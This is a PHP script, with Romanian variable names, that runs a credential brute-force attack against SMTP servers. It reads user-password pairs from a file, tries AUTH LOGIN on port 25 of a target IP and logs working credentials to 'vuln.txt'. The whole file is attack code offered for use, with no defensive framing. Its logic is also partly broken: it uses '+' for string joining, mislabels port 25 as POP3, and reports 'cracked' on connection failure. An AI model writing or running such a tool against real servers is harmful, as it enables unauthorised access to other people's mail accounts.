<?php

function fetch_esmtp_response($source) {
    $response = array();
    do
    {
        $s = fgets($source, 1024);
        $response[] = $s;
    }  while( strlen($s) > 3 && ' '!==$s[3]);
    return $response;
}

function POPa($username, $password, $server) {
$socket = fsockopen($server, 25); // POP3 port
if (!$socket) {
return "cracked";

}

$res = fgets($socket, 512); // read +OK
echo "socket response = " + $res;
if (substr(trim($res), 0, 3) != "220") {
echo "socket response = 220";
return "cracked"; // return the error
}
fputs($socket, "EHLO $server\r\n"); // ehlo command
$response = fetch_esmtp_response($socket);
$res = trim(end($response));  
if (substr(trim($res), 0, 3) != "250") {
echo "EHLO  response = 250";
return "cracked";
}


fputs($socket, "AUTH LOGIN\r\n"); // send pass
$res = fgets($socket, 512); // read +OK
echo "AUTH LOGIN = " + $res;
if (substr(trim($res), 0, 3) != "334") {
return "cracked";
}
fputs($socket, "$username\r\n"); // send pass
$res = fgets($socket, 512); // read +OK
echo "$username" + $res;
if (substr(trim($res), 0, 3) != "334") {
return $res;
}
fputs($socket, "$password\r\n"); // send pass
$res = fgets($socket, 512); // read +OK
echo "$password" + $res;
if (substr(trim($res), 0, 3) != "235") {
return $res;
}

fputs($socket, "QUIT\r\n"); // quit

fclose($socket);
$fp = fopen("vuln.txt", "a");
fwrite($fp, $server .' '. base64_decode($username) .' '. 
base64_decode($password) . "\r\n");
fclose($fp);
return "cracked";
}

//SET INITIAL LOAD
$ip = $argv[1];


//READ USER/PASS FILE
$fp = fopen("pass_file", "r");
$i = 1;
$c2= 1;
while (!feof($fp)) {
$propozitie = fgets($fp, 4096);
$propozitie = explode("-", $propozitie);
$user[$i] = preg_replace('/\s+/', '', $propozitie[0]);
$pass[$i] = preg_replace('/\s+/', '', $propozitie[1]);
$i = $i + 1;
$c2 = $c2 + 1;
}
fclose($fp);

//Do BRUTE-FORCE ATACK
$x = 1;
$chestie = "not";

while (( $x < $c2 ) and ( $chestie != "cracked" )) {
$chestie = POPa(base64_encode($user[$x]), base64_encode($pass[$x]), $ip);
if ( $chestie == "cracked" ) {
$quit = 1;
}
$x = $x + 1;
}

//SET END LOAD


?>
